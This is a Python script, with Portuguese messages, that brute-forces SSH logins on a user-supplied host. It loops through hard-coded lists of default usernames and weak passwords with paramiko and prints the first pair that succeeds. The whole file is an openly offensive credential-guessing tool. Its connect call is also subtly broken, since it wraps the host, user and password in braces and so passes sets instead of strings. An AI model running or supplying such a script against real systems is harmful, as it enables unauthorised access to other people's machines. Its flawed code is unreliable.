import paramiko

host = input("informe o host: ")
port = 22

if not host:
    print("informe o host!")
    exit()

users = [
    "admin",
    "root",
    "user",
    "guest",
    "admin1",
    "admin123",
    "adminadmin",
    "administrator",
    "operator",
    "support",
    "superuser",
    "administrator",
    "rootuser",
    "adminadmin123",
    "admin1234",
    "admin12345",
    "admin123456",
    "admin1234567",
    "admin12345678",
    "admin123456789",
    "admin1234567890",
    "user123",
    "user1234",
    "user12345",
    "user123456",
    "user1234567",
    "user12345678",
    "user123456789",
    "user1234567890",
    "guest123",
    "guest1234",
    "guest12345",
    "guest123456",
    "guest1234567",
    "guest12345678",
    "guest123456789",
    "guest1234567890",
    "support123",
    "support1234",
    "support12345",
    "support123456",
    "support1234567",
    "support12345678",
    "support123456789",
    "support1234567890"
]

passwords = [
    "admin",
    "password",
    "1234",
    "admin123",
    "root",
    "adminadmin",
    "senha",
    "12345",
    "admin1234",
    "admin12345",
    "123456",
    "admin1",
    "admin12",
    "admin123456",
    "123456789",
    "admin123456789",
    "12345678",
    "admin12345678",
    "1234567",
    "admin1234567",
    "admin1234567890",
    "adminadmin123",
    "adminadmin123456",
    "adminadmin123456789",
    "password123",
    "password1234",
    "adminadminadmin",
    "adminadminadmin123",
    "adminadminadmin123456",
    "default",
    "1234567",
    "adminpassword",
    "rootroot",
    "root123",
    "toor",
    "guest",
    "user",
    "qwerty",
    "abc123",
    "test",
    "test123",
    "internet",
    "password1",
    "adminadminadmin123456789",
    "adminadminadmin1234567890"
]

ssh_client = paramiko.SSHClient()
ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for user in users:
    for password in passwords:
        try:
            ssh_client.connect(hostname={host}, port=port, username={user}, password={password})
            print("login encontrado! user: {}; senha: {}.".format(user, password))
            ssh_client.close()
            exit()
        except paramiko.AuthenticationException:
            print("Falha ao tenta fazer login com: user: {}; senha{}...".format(user, password))
